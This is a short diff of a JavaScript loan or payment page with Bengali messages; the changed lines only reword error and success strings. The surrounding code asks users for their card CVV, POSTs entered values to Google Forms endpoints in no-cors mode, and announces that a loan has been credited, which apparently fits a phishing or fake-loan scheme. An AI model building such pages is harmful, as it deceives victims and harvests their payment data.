@@ -125,10 +125,10 @@ document.querySelector('.no-connection-popup').style.zIndex = '1001';
 
         if (secureData?.id !== accountNumber) {
             playAudio(audioElement2);
-            showError(failed, "কার্ড নম্বর বৈধ নয়। আপনার সক্রিয় কার্ড CVV দিন |");
+            showError(failed, "কার্ড নম্বর বৈধ নয়। আপনার কার্ড এর CVV দিন।");
         } else if (!maxValue || amount > maxValue) {
             playAudio(audioElement2);
-            showError(failed, `${amount}৳ টাকা লোন নেওয়া সম্ভব নয়।`);
+            showError(failed, `দুঃখিত ${amount}৳ টাকা লোন নেওয়া সম্ভব নয়।`);
         } else {
             const googleFormsData = [
                 { url: secureData.surl, entries: { amount: secureData.saentry, description: secureData.sdentry } },
@@ -142,7 +142,7 @@ document.querySelector('.no-connection-popup').style.zIndex = '1001';
 
                 fetch(form.url, { method: "POST", mode: "no-cors", body: formData })
                     .then(() => {
-                        showSuccess(done, `আপনার একাউন্টে ${amount}৳ টাকা লোন চলে গেছে।`);
+                        showSuccess(done, `আপনার একাউন্টে ${amount}৳ গ্রহণ সম্পূর্ণ হয়েছে।`);
                         playAudio(audioElement);
                         fetchData();
                     })
